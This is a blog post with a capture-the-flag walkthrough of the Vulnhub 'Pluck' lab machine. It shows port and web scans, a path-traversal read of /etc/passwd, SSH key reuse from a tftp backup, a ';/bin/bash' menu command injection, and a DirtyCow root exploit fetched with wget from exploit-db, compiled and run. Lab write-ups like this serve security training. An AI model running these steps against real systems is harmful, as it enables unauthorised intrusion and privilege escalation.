---
layout:     post
title:      "Vulnhub.com - Pluck"
subtitle:   "Write-Up"
date:       2017-03-26 2:00:00
author:     "W3ndige"
header-img: "img/pluck-header.jpg"
permalink: /:title/
category: Vulnhub
---

<h1>Introduction</h1>

<p>In this post we're going to work on a short, but still great machine from <b>Vulnhub</b> called <a href="https://www.vulnhub.com/entry/pluck-1,178/"><b>Pluck</b></a>. Let's start! </p>

<h1>Write-Up</h1>

<p>Our Pluck machine was assigned with <b>10.0.2.6</b> IP address, so firstly we have to scan it in order to check any open ports. As always, <b>Nmap</b> is our best friend.  </p>

{% highlight bash %}
root@kali:~# nmap -T4 -A -v -p 0-65535 10.0.2.6

Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-25 12:39 EDT
NSE: Loaded 132 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
Initiating NSE at 12:39
Completed NSE at 12:39, 0.00s elapsed
Initiating ARP Ping Scan at 12:39
Scanning 10.0.2.6 [1 port]
Completed ARP Ping Scan at 12:39, 0.02s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:39
Completed Parallel DNS resolution of 1 host. at 12:39, 6.67s elapsed
Initiating SYN Stealth Scan at 12:39
Scanning 10.0.2.6 [65536 ports]
Discovered open port 80/tcp on 10.0.2.6
Discovered open port 3306/tcp on 10.0.2.6
Discovered open port 22/tcp on 10.0.2.6
Discovered open port 5355/tcp on 10.0.2.6
Completed SYN Stealth Scan at 12:39, 4.53s elapsed (65536 total ports)
Initiating Service scan at 12:39
Scanning 4 services on 10.0.2.6
Completed Service scan at 12:41, 110.26s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.2.6
NSE: Script scanning 10.0.2.6.
Initiating NSE at 12:41
Completed NSE at 12:41, 7.62s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.01s elapsed
Nmap scan report for 10.0.2.6
Host is up (0.00076s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  unknown
MAC Address: 08:00:27:45:29:54 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Uptime guess: 0.002 days (since Sat Mar 25 12:39:21 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.76 ms 10.0.2.6

NSE: Script Post-scanning.
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Initiating NSE at 12:41
Completed NSE at 12:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.02 seconds
           Raw packets sent: 65559 (2.885MB) | Rcvd: 65558 (2.623MB)

{% endhighlight %}

<p>Great, we can now check the website running at port <b>80</b>.</p>

![First Look](/img/pluck/first-look.png){:class="img-responsive center-block"}

<p>Really simple, but with potential components to exploit, like admin panel. In addition, we can see that the <b>about</b> page may contain some clues. </p>

![About](/img/pluck/about.png){:class="img-responsive center-block"}

<p>Before further looking, let's fire up <b>Nikto</b> scan. Maybe it will show us the way?</p>

{% highlight bash %}
root@kali:~# nikto -h 10.0.2.6
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.6
+ Target Hostname:    10.0.2.6
+ Target Port:        80
+ Start Time:         2017-03-22 08:46:22 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-03-22 08:46:43 (GMT-4) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

<p><b>File Traversal</b> vulnerability? Great, we can take a look at <b>/etc/passwd</b> file.</p>

![Passwd](/img/pluck/passwd.png){:class="img-responsive center-block"}

<p>After looking at the source code we can see it in plain format, not in this... something. What got me interested is the <b>entry for backup user</b>.</p>

{% highlight bash %}
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
{% endhighlight %}

<p>Maybe we can further exploit vulnerability and view <b>backup.sh</b> script?</p>

![Backup](/img/pluck/backup.png){:class="img-responsive center-block"}

<p>Awesome! We know that backups are available via <b>tftp</b> so let's connect and download them. </p>

{% highlight bash %}
root@kali:~# tftp 10.0.2.6
tftp> get backup.tar
Received 1824718 bytes in 1.1 seconds
{% endhighlight %}

<p>After unpacking it, I wondered around a few directories, finally finding <b>ssh</b> keys in <b>/home/paul/keys</b> directory. </p>

![Keys](/img/pluck/keys.png){:class="img-responsive center-block"}

<p>Now we have to test which key is valid. After a few moments I've found that the working one is <b>id_key4</b>. Remember to set proper permissions! </p>

{% highlight bash %}
root@kali:~/Documents/backup/home/paul/keys# chmod 600 id_key4
{% endhighlight %}

<p>And now let's log in using <b>ssh</b>. </p>

{% highlight bash %}
root@kali:~/Documents/backup/home/paul/keys# ssh -i id_key4 paul@10.0.2.6
{% endhighlight %}

<p>Hmm... That's a little different from normal screen you see after log in. </p>

![Pdmenu](/img/pluck/pdmenu.png){:class="img-responsive center-block"}

<p>Here, I decided to perform <b>Command Injection</b> and try to get bash shell by typing <b>;/bin/bash</b>. </p>

![Pdmenu Bash](/img/pluck/bash.png){:class="img-responsive center-block"}

<p>We have the paul's shell! </p>

{% highlight bash %}
root@kali:~/Documents/backup/home/paul/keys# ssh -i id_key4 paul@10.0.2.6
Last login: Sat Mar 25 18:53:58 2017 from 10.0.2.15
uid=1002(paul) gid=1002(paul) groups=1002(paul)

Press Enter to return to Pdmenu.
paul@pluck:~$
{% endhighlight %}

<p>Now, last part - privilage escalation. Let's firstly see, which version of Linux kernel we're running. </p>

{% highlight bash %}
paul@pluck:~$ uname -a
Linux pluck 4.8.0-22-generic #24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
{% endhighlight %}

<p>Linux 4.8? <a href="https://dirtycow.ninja/"><b>DirtyCow</b></a> should work against this kind of kernel. We will firstly download it, compile and hopefully it will give us root. </p>

{% highlight bash %}
paul@pluck:~$ wget https://www.exploit-db.com/download/40616
--2017-03-25 19:14:29--  https://www.exploit-db.com/download/40616
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4965 (4.8K) [application/txt]
Saving to: ‘40616’

40616               100%[===================>]   4.85K  --.-KB/s    in 0s      

2017-03-25 19:14:30 (149 MB/s) - ‘40616’ saved [4965/4965]

paul@pluck:~$ mv 40616 dirtycow.c
paul@pluck:~$ gcc dirtycow.c -o  dirtycow -pthread
dirtycow.c: In function ‘procselfmemThread’:
dirtycow.c:99:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [-Wint-conversion]
         lseek(f,map,SEEK_SET);
                 ^~~
In file included from dirtycow.c:28:0:
/usr/include/unistd.h:337:16: note: expected ‘__off_t {aka long int}’ but argument is of type ‘void *’
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^~~~~
dirtycow.c: In function ‘main’:
dirtycow.c:136:5: warning: implicit declaration of function ‘asprintf’ [-Wimplicit-function-declaration]
     asprintf(&backup, "cp %s /tmp/bak", suid_binary);
     ^~~~~~~~
dirtycow.c:140:5: warning: implicit declaration of function ‘fstat’ [-Wimplicit-function-declaration]
     fstat(f,&st);
     ^~~~~
dirtycow.c:142:30: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘__off_t {aka long int}’ [-Wformat=]
     printf("Size of binary: %d\n", st.st_size);
                              ^
paul@pluck:~$ ./dirtycow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 54256
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Dont forget to restore /tmp/bak
thread stopped
root@pluck:/home/paul# cat /root/flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                     
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                    
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&

{% endhighlight %}

<p>Amazing, we have the flag! </p>

<h1>Conclusion</h1>

<p>It was nice little challenge with little dose of surprises. Thanks <a href="https://twitter.com/@ryanoberto"><b>Ryan Oberto</b></a> for creating this great challenge, <a href="https://www.vulnhub.com/"><b>Vulnhub</b></a> for hosting and <b>Yodak#2187</b> for joining!  </p>

<p>~ Stay safe!</p>
